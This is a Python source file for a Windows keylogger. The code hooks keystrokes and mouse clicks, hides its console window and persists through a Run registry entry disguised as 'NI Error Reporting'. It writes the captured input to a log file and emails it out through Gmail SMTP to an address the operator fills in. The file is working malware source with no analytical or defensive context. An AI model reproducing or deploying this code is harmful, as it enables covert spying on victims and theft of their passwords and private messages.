import sys,win32api,pythoncom
import pyHook,os,time,random,smtplib,string
import urllib
from _winreg import *

global t,yourgmail,yourgmailpass,sendto,interval

#########Settings########
yourgmail="here your gmail"
yourgmailpass="here your password"
sendto="whom send the result"
interval=25  
t="";        
########################
try:
    f = open('Logfile.txt', 'a')
    f.close()
except:
    f = open('Logfile.txt', 'w')
    f.close()
	
def addStartup():  # this will add the file to the startup registry key
    fp = os.path.dirname("C:\Windows\System32")
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + "Ni Error"
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'NI Error Reporting.lnl', 0, REG_SZ,new_file_path)    
	
def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

def Mail_it(data):
    data = 'Text:\n' + data
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(yourgmail, yourgmailpass)
    server.sendmail(yourgmail, sendto, data)
    server.close()	

def OnMouseEvent(event):
    global t
    data = '['+ str(event.MessageName)+']'
    t = t + data
    if len(t) >= 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        Mail_it(t)
        t = ''
    return True

def OnKeyboardEvent(event):
    global t
    data = str(event.Key)
    t = t + data
    if len(t) >= 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        Mail_it(t)
        t = ''
        
    return True

def Main():
    try:
     addStartup()
     Hide()
     urllib.urlopen("http://google.com")
     hook = pyHook.HookManager()
     hook.KeyDown = OnKeyboardEvent
     hook.MouseAllButtonsDown = OnMouseEvent
     hook.HookKeyboard()
     hook.HookMouse()
     pythoncom.PumpMessages()
    except IOError:
     time.sleep(interval)
     Main()
     "Internet off"

Main()
